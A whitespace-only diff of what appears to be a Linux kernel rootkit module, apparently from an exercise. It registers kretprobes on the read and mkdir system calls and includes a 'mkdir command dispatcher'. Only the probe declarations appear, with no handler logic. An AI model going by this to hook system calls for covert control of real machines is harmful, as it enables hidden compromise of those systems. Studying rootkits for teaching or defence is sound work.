@@ -54,11 +54,11 @@ static int read_return(struct kretprobe_instance *ri, struct pt_regs *regs)
 }
 
 static struct kretprobe read_probe = {
-	.handler        = read_return,
-	.entry_handler  = read_entry,
-	.data_size      = sizeof(struct read_data),
-	.maxactive      = 20,
-	.kp.symbol_name = "ksys_read",
+    .handler = read_return,
+    .entry_handler = read_entry,
+    .data_size = sizeof(struct read_data),
+    .maxactive = 20,
+    .kp.symbol_name = "ksys_read",
 };
 
 /* ---- mkdir command dispatcher (provided) ---- */
@@ -134,7 +134,7 @@ static int rk_mkdir_entry_mkdirat(struct kretprobe_instance *inst,
 }
 
 static int rk_mkdir_return(struct kretprobe_instance *inst,
-			    struct pt_regs *regs)
+			   struct pt_regs *regs)
 {
 	struct rk_mkdir_data *data;
 
@@ -145,19 +145,19 @@ static int rk_mkdir_return(struct kretprobe_instance *inst,
 }
 
 static struct kretprobe rk_mkdir_probe = {
-	.kp.symbol_name = "__x64_sys_mkdir",
-	.entry_handler  = rk_mkdir_entry_mkdir,
-	.handler        = rk_mkdir_return,
-	.data_size      = sizeof(struct rk_mkdir_data),
-	.maxactive      = 8,
+    .kp.symbol_name = "__x64_sys_mkdir",
+    .entry_handler = rk_mkdir_entry_mkdir,
+    .handler = rk_mkdir_return,
+    .data_size = sizeof(struct rk_mkdir_data),
+    .maxactive = 8,
 };
 
 static struct kretprobe rk_mkdirat_probe = {
-	.kp.symbol_name = "__x64_sys_mkdirat",
-	.entry_handler  = rk_mkdir_entry_mkdirat,
-	.handler        = rk_mkdir_return,
-	.data_size      = sizeof(struct rk_mkdir_data),
-	.maxactive      = 8,
+    .kp.symbol_name = "__x64_sys_mkdirat",
+    .entry_handler = rk_mkdir_entry_mkdirat,
+    .handler = rk_mkdir_return,
+    .data_size = sizeof(struct rk_mkdir_data),
+    .maxactive = 8,
 };
 
 /* ---- module lifecycle ---- */
